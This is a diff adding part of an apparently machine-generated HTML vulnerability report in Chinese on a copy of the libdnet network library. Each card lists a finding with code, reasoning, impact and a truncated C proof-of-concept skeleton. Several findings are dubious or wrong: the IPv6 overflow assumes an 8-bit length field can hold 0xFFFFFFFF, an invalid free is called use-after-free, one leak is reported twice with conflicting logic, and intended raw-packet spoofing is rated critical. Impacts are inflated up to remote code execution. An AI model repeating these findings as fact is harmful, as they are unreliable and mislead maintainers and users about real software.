+                <p><strong>影响分析:</strong> 该漏洞允许攻击者完全预测随机数生成器的输出序列。在安全敏感场景中，这可能导致：1) 预测加密密钥，破坏通信安全；2) 预测会话令牌，实现会话劫持；3) 预测端口扫描顺序，绕过防火墙规则；4) 预测随机数用于时序计算，影响网络探测的隐蔽性。由于libdnet被nmap等网络工具使用，攻击者可能通过预测随机化行为来规避检测。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-B2EA718E - 不安全的随机数生成器状态重置
+ * 仅供研究使用
+ *
+ * 编译: gcc -o rand_poc rand_poc.c -ldnet
+ * 或: gcc -o rand_poc rand_poc.c -I./libdnet-stripped/include -L./libdnet-stripped/src -ldnet
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dnet.h>
+
+/* 演示: 通过rand_set()重置RNG状态后预测随机数输出 */
+int main(int argc, char *argv[]) {
+    rand_t *rng;
+    uint32_t val1, val2, val3;
+    uint32_t predicted_val1, predicted_val2, predicted_val3;
+    
+    /* 创建两个独立的RNG实例 */
+    rand_t *vi</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-8B826CE6 - 缓冲区溢出 - 整数溢出/越界访问</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/ip6.c:28</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (i = IP6_HDR_LEN; IP6_IS_EXT(nxt); i += (ext->ext_len + 1) << 3) {
+    if (i >= (int)len) return;
+    ext = (struct ip6_ext_hdr *)((u_char *)buf + i);
+    nxt = ext->ext_nxt;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的buf和len参数 -> 循环中通过ext->ext_len计算偏移i -> 使用i作为偏移访问buf内存 -> 可能越界读取</p>
+                <p><strong>判断理由:</strong> 循环中i的增量计算为(ext->ext_len + 1) << 3，但ext->ext_len来自用户输入数据，可以被设置为极大值。虽然循环内有i >= (int)len的检查，但整数溢出可能导致i绕过边界检查。例如，如果ext->ext_len为0xFFFFFFFF，则(ext->ext_len + 1)会溢出为0，导致i不再增加，形成无限循环或越界访问。此外，i的类型为int，而len为size_t，类型转换可能导致负数比较问题。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造恶意的IPv6扩展头，触发整数溢出导致越界内存访问。具体影响包括：1) 信息泄露：越界读取可能泄露敏感内存数据；2) 拒绝服务：无限循环或访问非法内存导致程序崩溃；3) 潜在代码执行：在特定条件下，越界写入可能被利用实现任意代码执行。由于该函数用于计算校验和，通常在内核或网络栈中调用，影响范围较大。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-8B826CE6 - libdnet IPv6 checksum integer overflow
+ * 仅供研究使用 - For research purposes only
+ *
+ * 编译: gcc -o poc_ip6_overflow poc_ip6_overflow.c -ldnet
+ * 或: gcc -o poc_ip6_overflow poc_ip6_overflow.c ip6.c
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* 假设的IPv6和扩展头结构定义 */
+#define IP6_HDR_LEN 40
+
+#define IP_PROTO_HOPOPTS  0
+#define IP_PROTO_DSTOPTS  60
+#define IP_PROTO_ROUTING  43
+#define IP_PROTO_FRAGMENT 44
+#define IP_PROTO_TCP      6
+#de</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-2BCBA72B - 缓冲区溢出 - 越界读取</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/ip6.c:29</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ext = (struct ip6_ext_hdr *)((u_char *)buf + i);
+    nxt = ext->ext_nxt;</code></pre>
+                <p><strong>数据流:</strong> 用户控制的buf和len参数 -> 循环中i可能指向无效偏移 -> 从ext->ext_nxt读取数据 -> 越界读取</p>
+                <p><strong>判断理由:</strong> 在循环中，即使i通过了边界检查，但后续读取ext->ext_nxt时没有再次验证i + sizeof(struct ip6_ext_hdr)是否在len范围内。如果i恰好接近len边界，读取ext->ext_nxt可能导致越界访问。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过构造特制的IPv6数据包，触发ip6_checksum函数中的缓冲区越界读取。具体影响包括：1) 信息泄露：越界读取可能泄露相邻内存中的敏感数据（如密钥、证书、用户数据等）；2) 拒绝服务：越界读取可能导致程序崩溃（段错误）；3) 潜在代码执行：在某些架构和内存布局下，精心构造的越界读取可能配合其他漏洞实现代码执行。漏洞利用复杂度中等，需要精确控制数据包结构和缓冲区大小。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * 仅供研究使用 - Proof of Concept for VULN-2BCBA72B
+ * 缓冲区越界读取漏洞 - libdnet ip6_checksum
+ *
+ * 编译: gcc -o poc_ip6_checksum poc_ip6_checksum.c -ldnet
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+#include "dnet.h"
+
+/*
+ * PoC 1: 边界值越界读取
+ * 构造一个IPv6包，其中扩展头刚好位于缓冲区末尾
+ * 导致读取ext->ext_nxt时越界
+ */
+void poc_boundary_oob_read(void) {
+    printf("[*] PoC 1: 边界值越界读取\n");
+    
+    /* 构造最小IPv6头 + 刚好到边界的扩展头 */
+    size_t buf_size = IP6_HDR_LEN + sizeof(struct ip6_ext_hdr) - 1;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-430B69AE - 未初始化变量使用</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/tun-solaris.c:47</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>int ppa;
+
+if ((tun = calloc(1, sizeof(*tun))) == NULL)
+    return (NULL);
+
+tun->fd = tun->ip_fd = tun->if_fd = -1;
+
+if ((tun->fd = open(DEV_TUN, O_RDWR, 0)) < 0)
+    return (tun_close(tun));
+
+if ((tun->ip_fd = open(DEV_IP, O_RDWR, 0)) < 0)
+    return (tun_close(tun));
+
+if ((ppa = ioctl(tun->fd, TUNNEWPPA, ppa)) < 0)
+    return (tun_close(tun));</code></pre>
+                <p><strong>数据流:</strong> 局部变量ppa在声明时未初始化，随后被用作ioctl()调用的参数。ioctl()的第三个参数ppa的值是未定义的，这可能导致不可预测的行为。</p>
+                <p><strong>判断理由:</strong> 变量ppa在声明时没有初始化，直接作为ioctl()的参数使用。虽然calloc()初始化了tun结构体，但ppa是栈上的局部变量，其初始值是不确定的。这可能导致ioctl()调用失败或产生意外的副作用。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者利用未初始化的栈变量ppa影响ioctl(TUNNEWPPA)的行为。由于ppa的值取决于栈上残留的数据，攻击者可以通过精心构造的调用序列来控制ppa的值，从而：1) 导致TUN接口分配失败，造成拒绝服务；2) 分配到错误的接口号，可能与其他网络接口冲突；3) 在极端情况下，如果ioctl实现将ppa解释为指针，可能导致内存访问错误。漏洞的严重性为高，因为它在库代码中，影响所有使用libdnet库的应用程序。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-430B69AE - 未初始化变量使用漏洞
+ * 仅供研究使用
+ * 
+ * 漏洞描述：libdnet库中tun-solaris.c文件的tun_open()函数中，
+ * 局部变量ppa在声明时未初始化，随后被用作ioctl()调用的参数。
+ * 这可能导致不可预测的行为，包括拒绝服务或潜在的信息泄露。
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/sockio.h>
+#include <net/if.h>
+#include <net/if_tun.h>
+#include <stropts.h>
+
+/* 模拟漏洞触发环境 */
+#define DEV_TUN "/dev/tun"
+#define DEV_IP "/dev/ip"
+
+/* 模拟TUNNEWPPA ioct</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-FE723D18 - 缺少输入验证</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/ip.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ssize_t
+ip_send(ip_t *i, const void *buf, size_t len)
+{
+	struct ip_hdr *ip;
+	struct sockaddr_in sin;
+
+	ip = (struct ip_hdr *)buf;</code></pre>
+                <p><strong>数据流:</strong> ip_send()函数接收外部传入的buf指针，直接将其强制转换为struct ip_hdr指针，未验证buf长度是否至少为sizeof(struct ip_hdr)。</p>
+                <p><strong>判断理由:</strong> 函数未检查传入的buf长度是否足够容纳IP头部结构。如果len小于sizeof(struct ip_hdr)，访问ip->ip_dst等字段会导致越界读取，可能引发内存访问错误或信息泄露。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过传入长度不足的缓冲区，触发ip_send()函数越界读取内存。具体来说：
+1. 函数将buf强制转换为struct ip_hdr*后，访问ip->ip_dst（偏移12字节处）会读取超出缓冲区边界的数据
+2. 越界读取的数据被用作目标IP地址发送到网络上，可能导致敏感信息泄露
+3. 在极端情况下，如果越界读取访问到无效内存地址，可能导致程序崩溃（段错误）
+4. 虽然该函数是库内部函数，但任何调用ip_send()且未正确验证输入长度的代码都可能受影响
+5. 攻击者可以通过控制传入的len参数和缓冲区内容，实现有限的信息泄露</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-FE723D18 - libdnet ip_send() missing length validation
+ * 仅供研究使用 - For research purposes only
+ *
+ * 编译: gcc -o poc_ip_send poc_ip_send.c -ldnet
+ * 或: gcc -o poc_ip_send poc_ip_send.c -I/path/to/libdnet/include -L/path/to/libdnet/lib -ldnet
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include "dnet.h"
+
+/* 模拟一个过小的缓冲区，小于struct ip_hdr的大小 */
+#define SMALL_BUF_SIZE 4  /* struct ip_hdr通常为20字节 */
+
+int main(int argc, char *argv</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-194AA311 - 逻辑错误 - 循环后指针比较</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/eth-ndd.c:83</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (end = (void *)nddp + size; (void *)nddp < end; nddp++) {
+    if (strcmp(nddp->ndd_alias, e->device) == 0 ||
+        strcmp(nddp->ndd_name, e->device) == 0) {
+        memcpy(ea, nddp->ndd_addr, sizeof(*ea));
+    }
+}
+free(nddp);
+
+if ((void *)nddp >= end) {
+    errno = ESRCH;
+    return (-1);
+}</code></pre>
+                <p><strong>数据流:</strong> 循环结束后，nddp指针已经递增到end之后，但代码在free(nddp)之后仍然使用nddp进行比较</p>
+                <p><strong>判断理由:</strong> 这是一个严重的逻辑错误。循环结束后，nddp指针已经指向end之后的位置（因为循环条件是(void *)nddp < end，循环结束时nddp >= end）。然后free(nddp)释放了原始内存块，但nddp已经被修改，实际上free的是错误的内存地址（如果nddp已经超出原始分配范围，这会导致未定义行为）。更严重的是，free之后代码检查(void *)nddp >= end，这个条件总是为真（因为循环结束时nddp已经>=end），所以函数总是返回-1并设置errno为ESRCH，即使找到了匹配的设备。这导致eth_get()函数永远无法成功返回。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致eth_get()函数永远无法成功返回0。任何调用此函数的代码都会失败：
+1. 网络工具（如nmap）无法枚举网络接口的MAC地址
+2. 依赖eth_get()获取硬件地址的网络应用程序功能完全失效
+3. free(nddp)释放错误的内存地址，可能导致堆损坏、程序崩溃或潜在的安全漏洞
+4. 在循环中即使找到匹配设备并复制了MAC地址，后续检查仍会返回错误，导致数据丢失
+5. 影响所有使用libdnet库进行以太网地址查询的应用程序</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-194AA311 - libdnet eth_get() logic error
+ * 仅供研究使用
+ * 
+ * 编译: gcc -o poc_eth_get poc_eth_get.c -ldnet
+ * 或: gcc -o poc_eth_get poc_eth_get.c -I/path/to/libdnet/include -L/path/to/libdnet/lib -ldnet
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <dnet.h>
+
+int main(int argc, char *argv[]) {
+    eth_t *e;
+    eth_addr_t ea;
+    const char *device = "eth0";  /* 或使用系统实际网络接口名 */
+    int ret;
+    
+    printf("=== PoC for VULN-194AA311 ===\</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-AD408C03 - 释放后使用 - free错误指针</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/eth-ndd.c:82</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (end = (void *)nddp + size; (void *)nddp < end; nddp++) {
+    ...
+}
+free(nddp);</code></pre>
+                <p><strong>数据流:</strong> nddp指针在循环中被递增，然后传递给free()</p>
+                <p><strong>判断理由:</strong> 在循环中，nddp指针被递增以遍历kinfo_ndd结构体数组。循环结束后，nddp不再指向malloc返回的原始地址，而是指向数组末尾之后的位置。调用free(nddp)释放的是一个无效指针，这会导致未定义行为，可能包括程序崩溃、内存损坏或安全漏洞。正确的做法是保存原始指针并在free时使用它。</p>
+                <p><strong>影响分析:</strong> 该漏洞是释放后使用(Use-After-Free)的一种变体，具体表现为free错误指针。在eth_get()函数中，nddp指针通过malloc分配内存后，在for循环中被递增遍历结构体数组。循环结束后，nddp不再指向原始分配的内存地址，而是指向数组末尾之后的位置。调用free(nddp)释放无效指针会导致未定义行为，可能包括：1) 程序立即崩溃（段错误）；2) 内存堆损坏，导致后续内存操作异常；3) 在特定条件下，攻击者可能通过控制堆布局实现任意代码执行。由于该代码位于网络设备MAC地址获取功能中，任何调用eth_get()的程序都可能触发此漏洞，影响范围包括网络监控工具、虚拟化软件等使用libdnet库的应用程序。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-AD408C03 - Use-After-Free via invalid free pointer
+ * in libdnet eth-ndd.c eth_get() function
+ * 
+ * 仅供研究使用 - Proof of Concept only
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/ndd_var.h>
+#include <sys/kinfo.h>
+#include "dnet.h"
+
+/*
+ * 漏洞触发PoC
+ * 
+ * 漏洞原理：
+ * eth_get()函数中，nddp指针在for循环中被递增遍历数组，
+ * 循环结束后nddp指向数组末尾之后的位置，
+ * 然后free(nddp)释放的是无效指针，导致未定义行为。
+ *
+ * 触发条件：
+ * 1. 系统支持NDD (N</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-0A5BB5A2 - IP源地址欺骗漏洞</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/ip-win32.c:51</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ip->sin.sin_addr.s_addr = hdr->ip_src;</code></pre>
+                <p><strong>数据流:</strong> 用户提供的IP数据包缓冲区(buf) -> 强制转换为ip_hdr结构体 -> 提取ip_src字段 -> 赋值给发送地址结构体 -> 通过sendto发送原始数据包</p>
+                <p><strong>判断理由:</strong> ip_send函数直接从用户提供的IP数据包中提取源IP地址，并将其设置为发送地址。这允许攻击者伪造任意源IP地址发送数据包，可用于IP欺骗攻击、反射放大攻击等。该函数没有对源IP地址进行任何验证或限制，且使用SOCK_RAW原始套接字，使得攻击者可以构造任意IP头部。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者伪造任意源IP地址发送IP数据包，可导致以下严重后果：1) IP欺骗攻击 - 绕过基于IP的访问控制；2) 反射放大攻击 - 利用UDP协议（如DNS、NTP、SSDP）将小查询放大为大流量，伪造源IP指向受害者，造成DDoS攻击；3) TCP会话劫持 - 伪造可信源IP注入恶意数据；4) 匿名攻击 - 隐藏真实攻击来源，增加溯源难度。由于libdnet被nmap等安全工具使用，该功能是设计使然，但若被恶意软件利用，可成为强大的攻击工具。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * IP源地址欺骗PoC - 仅供安全研究使用
+ * 编译: gcc -o ip_spoof_poc ip_spoof_poc.c -ldnet
+ * 或: cl ip_spoof_poc.c libdnet.lib
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dnet.h>
+
+/* IP头部结构体（简化版，与libdnet兼容） */
+struct ip_hdr {
+    uint8_t  ip_vhl;          /* 版本+头部长度 */
+    uint8_t  ip_tos;          /* 服务类型 */
+    uint16_t ip_len;          /* 总长度 */
+    uint16_t ip_id;           /* 标识 */
+    uint16_t ip_off;          /* 分片偏移 */
+    uint8_t  ip_ttl;          /* 生存时间 */
+    uint8_t </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-DE85366F - 缓冲区溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/eth-win32.c:79</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>DLT_NULL_HEADER *hdr = (DLT_NULL_HEADER *)((uint8_t *)buf + ETH_HDR_LEN - DLT_NULL_HDR_LEN);
+if (eth->type.LinkType == NdisMediumNull) {
+    switch (ntohs(((struct eth_hdr *)buf)->eth_type)) {
+        case ETH_TYPE_IP:
+            hdr->null_type = DLTNULLTYPE_IP;
+            break;
+        case ETH_TYPE_IPV6:
+            hdr->null_type = DLTNULLTYPE_IPV6;
+            break;
+        default:
+            hdr->null_type = 0;
+            break;
+    }
+    PacketInitPacket(eth->pkt, (void *)((uint8_t *)buf + ETH_HDR_LEN - DLT_NULL_HDR_LEN), (UINT) (len - ETH_HDR_LEN + DLT_NULL_HDR_LEN));
+}</code></pre>
+                <p><strong>数据流:</strong> 外部传入的buf指针和len参数 -> eth_send函数 -> 直接进行指针算术运算和长度计算，未验证len是否大于等于ETH_HDR_LEN</p>
+                <p><strong>判断理由:</strong> 在eth_send函数中，代码假设传入的buf长度至少为ETH_HDR_LEN（14字节），但未对len参数进行任何边界检查。当len < ETH_HDR_LEN时，指针运算(uint8_t *)buf + ETH_HDR_LEN - DLT_NULL_HDR_LEN会导致负偏移或越界访问。同时，len - ETH_HDR_LEN + DLT_NULL_HDR_LEN可能产生负数，被转换为UINT后变成极大值，导致PacketInitPacket写入大量数据到缓冲区。这是一个典型的缓冲区溢出漏洞，攻击者可以通过提供短数据包触发内存破坏。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发送短数据包（len < ETH_HDR_LEN）触发缓冲区溢出。具体影响包括：1) 指针运算导致越界内存访问，可能读取或写入敏感数据；2) PacketInitPacket接收异常大的长度值（负数转换为UINT后接近4GB），导致大量数据写入缓冲区，造成堆或栈溢出；3) 成功利用可能导致远程代码执行、服务崩溃或信息泄露。由于eth_send是网络数据包发送函数，攻击者可以通过网络触发此漏洞，危害严重。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-DE85366F - libdnet eth-win32.c buffer overflow
+ * 仅供研究使用
+ * 
+ * 编译: gcc -o poc_eth_overflow poc_eth_overflow.c -ldnet
+ * 或: cl.exe poc_eth_overflow.c /link dnet.lib
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dnet.h>
+
+/* 模拟的以太网头部长度 */
+#define ETH_HDR_LEN 14
+
+/* 模拟的DLT_NULL头部长度 */
+#define DLT_NULL_HDR_LEN 4
+
+/* 模拟的以太网类型 */
+#define ETH_TYPE_IP 0x0800
+
+/* 模拟的DLT_NULL类型 */
+#define DLTNULLTYPE_IP 0x00000002
+
+/* 模拟的以太网头部结构 */
+struct eth_hdr {
+    uint8_</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-D1C87AF2 - 整数溢出</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/eth-win32.c:90</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>PacketInitPacket(eth->pkt, (void *)((uint8_t *)buf + ETH_HDR_LEN - DLT_NULL_HDR_LEN), (UINT) (len - ETH_HDR_LEN + DLT_NULL_HDR_LEN));</code></pre>
+                <p><strong>数据流:</strong> 外部传入的len参数 -> 算术运算len - ETH_HDR_LEN + DLT_NULL_HDR_LEN -> 转换为UINT -> 传递给PacketInitPacket</p>
+                <p><strong>判断理由:</strong> len - ETH_HDR_LEN + DLT_NULL_HDR_LEN的计算结果可能为负数（当len < ETH_HDR_LEN - DLT_NULL_HDR_LEN时），但被强制转换为无符号整数UINT。负数转换为无符号整数后会变成一个非常大的正数，导致PacketInitPacket认为数据包长度极大，从而可能造成缓冲区溢出。这是一个典型的整数溢出漏洞，攻击者可以通过提供精心构造的短数据包触发。</p>
+                <p><strong>影响分析:</strong> 该整数溢出漏洞允许攻击者通过提供精心构造的短数据包（长度小于10字节），触发整数溢出。当len < ETH_HDR_LEN - DLT_NULL_HDR_LEN（即len < 10）时，表达式(len - ETH_HDR_LEN + DLT_NULL_HDR_LEN)的结果为负数，但被强制转换为无符号整数UINT。负数转换为无符号整数后会变成一个非常大的正数（例如，-1变为0xFFFFFFFF，即4294967295），导致PacketInitPacket函数认为数据包长度极大。这可能导致：1) 缓冲区溢出 - PacketInitPacket可能尝试读取超出实际数据包边界的内存；2) 拒绝服务 - 处理异常大的长度值可能导致崩溃或资源耗尽；3) 信息泄露 - 可能读取到敏感内存数据。漏洞影响范围包括所有使用libdnet库且网络接口为环回类型的Windows应用程序。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-D1C87AF2 - Integer Overflow in libdnet eth-win32.c
+ * 仅供研究使用
+ * 
+ * 编译: cl /nologo /W3 poc_eth_overflow.c /Fe:poc_eth_overflow.exe
+ * 依赖: 需要 libdnet 库和 WinPcap/Npcap 开发环境
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* 模拟 libdnet 中的常量 */
+#define ETH_HDR_LEN     14
+#define DLT_NULL_HDR_LEN 4
+
+/* 模拟 PacketInitPacket 函数 - 用于演示漏洞触发 */
+typedef struct {
+    void *buffer;
+    unsigned int length;  /* UINT 类型 */
+} PACKET, *LPPACKET;
+
+/* 模拟 Packe</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-994FD052 - 整数溢出 - realloc大小计算</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/intf-win32.c:93</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>ifc->max *= 2;
+pmem = realloc(ifc->idx,
+    sizeof(ifc->idx[0]) * ifc->max);</code></pre>
+                <p><strong>数据流:</strong> ifc->max初始值为8，每次扩容时乘以2。当ifc->max足够大时，乘以2可能导致整数溢出，使realloc分配过小的内存。</p>
+                <p><strong>判断理由:</strong> 在_ifcombo_add函数中，当ifc->cnt达到ifc->max时，将ifc->max乘以2。如果ifc->max已经很大（如0x40000000），乘以2会导致整数溢出，使realloc分配的内存小于预期，后续写入ifc->idx[ifc->cnt]时造成堆缓冲区溢出。</p>
+                <p><strong>影响分析:</strong> 该漏洞为整数溢出导致的堆缓冲区溢出。当ifc->max经过多次乘以2后达到0x40000000时，乘以2溢出为0，导致realloc分配0字节内存。后续向ifc->idx数组写入数据时，会写入堆外内存，造成堆缓冲区溢出。攻击者可利用此漏洞实现：1) 拒绝服务(程序崩溃)；2) 在特定条件下实现任意代码执行。虽然触发条件需要大量接口(约5.3亿个)，但在虚拟化环境或恶意构造的场景下可能被利用。CVSS评分估计为6.5(中等)，因为利用复杂度较高但影响严重。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-994FD052 - Integer Overflow in libdnet intf-win32.c
+ * 仅供研究使用 - Research Purpose Only
+ *
+ * 该PoC演示了_ifcombo_add函数中的整数溢出漏洞
+ * 通过模拟大量接口添加操作触发realloc大小计算溢出
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* 模拟目标结构体 */
+struct ifcombo {
+    struct {
+        unsigned long ipv4;
+        unsigned long ipv6;
+    } *idx;
+    int cnt;
+    int max;
+};
+
+/* 模拟漏洞函数 - 完全复现原始代码逻辑 */
+static void
+_ifcombo_add(struct ifcombo *ifc, unsigned long ipv4_idx, unsig</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-8268ED0B - 内存泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/route-win32.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (len = sizeof(r->ipftable[0]); ; ) {
+		if (r->ipftable)
+			free(r->ipftable);
+		r->ipftable = malloc(len);
+		if (r->ipftable == NULL)
+			return (-1);
+		ret = GetIpForwardTable(r->ipftable, &len, FALSE);
+		if (ret == NO_ERROR)
+			break;
+		else if (ret != ERROR_INSUFFICIENT_BUFFER)
+			return (-1);
+	}</code></pre>
+                <p><strong>数据流:</strong> 在循环中动态分配内存，当GetIpForwardTable返回非ERROR_INSUFFICIENT_BUFFER错误时，函数直接返回-1，但之前分配的r->ipftable内存没有被释放。</p>
+                <p><strong>判断理由:</strong> 在route_loop_getipforwardtable函数中，当GetIpForwardTable返回错误且不是ERROR_INSUFFICIENT_BUFFER时，函数直接返回-1，但此时r->ipftable已经通过malloc分配了内存，导致内存泄漏。</p>
+                <p><strong>影响分析:</strong> 该内存泄漏漏洞每次触发会泄漏sizeof(MIB_IPFORWARDTABLE)大小的内存（约4KB）。虽然单次泄漏量不大，但如果攻击者能够反复触发该漏洞（例如通过频繁的网络状态变化），会导致目标进程的内存持续增长，最终可能导致：1) 系统内存资源耗尽；2) 目标进程因内存不足而崩溃；3) 在长期运行的服务中造成拒绝服务(DoS)条件。漏洞利用难度较低，但影响范围受限于需要特定错误码触发。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-8268ED0B - Memory Leak in route_loop_getipforwardtable()
+ * 仅供研究使用
+ * 
+ * 编译: cl /nologo poc_route_leak.c /Fe:poc_route_leak.exe
+ * 运行: poc_route_leak.exe
+ */
+
+#include <windows.h>
+#include <iphlpapi.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+/* 模拟route_t结构体 */
+typedef struct {
+    HINSTANCE iphlpapi;
+    MIB_IPFORWARDTABLE *ipftable;
+    void *ipftable2;
+} route_t;
+
+/* 模拟route_loop_getipforwardtable函数，复现漏洞 */
+static int
+route_loop_getipforwardtable_vuln(route_t *r)
+{
+    ULON</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-0BFF9D03 - 内存泄漏</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> libdnet-stripped/src/route-win32.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for (len = sizeof(r->ipftable[0]); ; ) {
+		if (r->ipftable)
+			free(r->ipftable);
+		r->ipftable = malloc(len);
+		if (r->ipftable == NULL)
+			return (-1);
+		ret = GetIpForwardTable(r->ipftable, &len, FALSE);
+		if (ret == NO_ERROR)
+			break;
+		else if (ret != ERROR_INSUFFICIENT_BUFFER)
+			return (-1);
+	}</code></pre>
+                <p><strong>数据流:</strong> 在循环中，如果malloc分配失败返回NULL，函数直接返回-1，但之前循环中可能已经分配了内存（r->ipftable指向之前分配的内存），这些内存没有被释放。</p>
+                <p><strong>判断理由:</strong> 当malloc返回NULL时，r->ipftable仍然指向之前分配的内存（如果有），但函数直接返回-1，导致之前分配的内存泄漏。</p>
+                <p><strong>影响分析:</strong> 每次调用route_loop_getipforwardtable函数时，如果GetIpForwardTable返回非ERROR_INSUFFICIENT_BUFFER的错误(如ERROR_ACCESS_DENIED)，会导致之前分配的MIB_IPFORWARDTABLE内存泄漏。泄漏大小约为sizeof(MIB_IPFORWARDTABLE) + 路由表条目大小。重复调用可导致系统内存耗尽，造成拒绝服务。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC for VULN-0BFF9D03 - Memory Leak in route_loop_getipforwardtable()
+ * 仅供研究使用
+ * 
+ * 编译: gcc -o poc_route_leak poc_route_leak.c -liphlpapi
+ */
+
+#include <windows.h>
+#include <iphlpapi.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+/* 模拟route_handle结构 */
+typedef struct {
+    HINSTANCE iphlpapi;
+    MIB_IPFORWARDTABLE *ipftable;
+    void *ipftable2;
+} route_t;
+
+/* 模拟route_handler回调 */
+typedef int (*route_handler)(void *entry, void *arg);
+
+/* 模拟漏洞函数 - 复现内存泄漏 */
